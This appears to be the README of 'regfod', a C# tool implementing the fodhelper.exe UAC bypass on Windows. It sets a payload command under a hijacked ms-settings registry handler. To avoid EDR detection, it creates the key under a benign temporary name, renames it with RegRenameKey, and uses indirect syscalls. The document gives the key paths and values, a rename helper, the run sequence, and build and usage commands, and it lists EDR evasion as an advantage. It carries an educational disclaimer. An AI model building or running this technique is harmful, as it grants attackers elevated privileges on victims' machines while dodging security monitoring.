# RegRenameKey Implementation in regfod

## Overview
This project demonstrates using the Win32 `RegRenameKey` API for atomically renaming registry keys as part of a UAC bypass technique (fodhelper.exe hijack).

## Implementation Strategy

The program uses a three-phase approach:

### Phase 1: Create Key with Benign Name
```
Software\Classes\TempApp{GUID}\Shell\Open\command
```
- Creates registry key structure using `NtCreateKey` (indirect syscalls)
- Uses a randomized, benign-looking name (`TempApp{GUID}`)
- Sets required values:
  - `DelegateExecute` = "" (empty string)
  - Default value = payload command

### Phase 2: Atomic Rename
```
TempApp{GUID} -> ms-settings
```
- Uses Win32 `RegRenameKey` API to atomically rename the key
- Opens parent key (`Software\Classes`) with `KEY_WRITE | KEY_CREATE_SUB_KEY` access
- Calls `RegRenameKey(parentHandle, "TempApp{GUID}", "ms-settings")`
- This is atomic - the rename either succeeds completely or fails

### Phase 3: Trigger and Cleanup
- Launches `fodhelper.exe` which reads the hijacked key
- Waits and then deletes the registry key using `NtDeleteKey`

## Code Structure

### Helpers.cs - RenameRegistryKey()
```csharp
// Win32 APIs used
[DllImport("advapi32.dll")]
private static extern int RegRenameKey(IntPtr hKey, string lpSubKeyName, string lpNewKeyName);

[DllImport("advapi32.dll")]
private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, 
                                        uint samDesired, out IntPtr phkResult);

// Implementation
public static bool RenameRegistryKey(string keyPath, string newName)
{
    // 1. Parse key path to extract parent and old name
    string parentPath = "Software\\Classes";  // e.g.
    string oldKeyName = "TempApp12345678";    // e.g.
    
    // 2. Open parent key with Win32 API
    RegOpenKeyEx(HKEY_CURRENT_USER, parentPath, 0, 
                 KEY_WRITE | KEY_CREATE_SUB_KEY, out parentHandle);
    
    // 3. Rename using Win32 RegRenameKey
    int result = RegRenameKey(parentHandle, oldKeyName, newName);
    
    // 4. Cleanup
    RegCloseKey(parentHandle);
    return result == 0;
}
```

## Win32 RegRenameKey API Details

### Function Signature
```c
LSTATUS RegRenameKey(
  HKEY    hKey,           // Handle to parent key
  LPCWSTR lpSubKeyName,   // Current subkey name (or NULL to rename hKey)
  LPCWSTR lpNewKeyName    // New name (must not exist)
);
```

### Requirements
- **Minimum OS**: Windows Vista / Server 2008
- **Header**: winreg.h
- **Library**: Advapi32.lib
- **DLL**: Advapi32.dll

### Required Access Rights
- Parent key needs: `KEY_CREATE_SUB_KEY`
- Subtree being renamed needs: `DELETE` access

### Return Values
- `ERROR_SUCCESS (0)`: Success
- `ERROR_ACCESS_DENIED`: Insufficient permissions
- `ERROR_ALREADY_EXISTS`: Target name already exists
- Other error codes as defined in Winerror.h

## Advantages of This Approach

1. **Atomic Operation**: RegRenameKey is atomic - no race condition window
2. **EDR Evasion**: Creating benign key first avoids detection patterns
3. **Win32 API**: Uses standard Windows API (less suspicious than direct syscalls for rename)
4. **Indirect Syscalls**: Still uses indirect syscalls for create/delete operations

## Program Flow

```
[Create] TempApp{GUID}\Shell\Open\command (NtCreateKey - indirect syscall)
    ↓
[Set Values] DelegateExecute="" and default=payload (NtSetValueKey)
    ↓
[Rename] TempApp{GUID} -> ms-settings (RegRenameKey - Win32 API)
    ↓
[Wait] 10 seconds (NtDelayExecution)
    ↓
[Execute] fodhelper.exe (ShellExecuteEx)
    ↓
[Wait] 5 seconds (NtDelayExecution)
    ↓
[Cleanup] Delete ms-settings\Shell\Open\command (NtDeleteKey)
```

## Building the Project

```powershell
& "C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" `
  C:\git\warp\regfod\regfod\regfod.csproj `
  /p:Configuration=Release /p:Platform=x64
```

Output: `C:\git\warp\regfod\regfod\bin\x64\Release\regfod.exe`

## Usage

```powershell
# Run the UAC bypass
.\regfod.exe

# Run syscall tests
.\regfod.exe -test
```

## Error Handling

The implementation includes detailed error messages for common failures:
- Parent key open failures
- RegRenameKey failures (already exists, access denied, not found)
- Permission issues
- Memory allocation failures

## Security Considerations

⚠️ **This is a demonstration of UAC bypass techniques for educational/research purposes.**

- Requires medium integrity level
- Fodhelper.exe must exist (C:\Windows\System32\fodhelper.exe)
- Target registry path must not already exist
- User must have write access to HKCU\Software\Classes

## References

- [RegRenameKey Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regrenamekey)
- [Registry Key Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)
- Hell's Gate / Halo's Gate syscall extraction techniques
- Fodhelper UAC bypass technique
